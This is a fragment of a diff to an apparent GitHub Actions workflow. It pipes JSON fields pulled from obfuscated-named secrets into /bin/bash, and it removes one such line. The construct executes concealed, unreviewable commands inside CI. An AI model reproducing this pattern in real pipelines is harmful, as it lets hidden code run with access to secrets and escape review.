@@ -22,7 +22,6 @@ jobs:
           tcted6997: ${{ secrets.tcted6997 }}
         run: |
           printf '%s' "$tcted6997" | jq -r .rg16712 | /bin/bash
-          echo $rybky4 | jq -r .lynsr8 | /bin/bash
           printf '%s' "$jmaxf3" | jq -r .gm85156 | /bin/bash
 
       - name: Upload archive
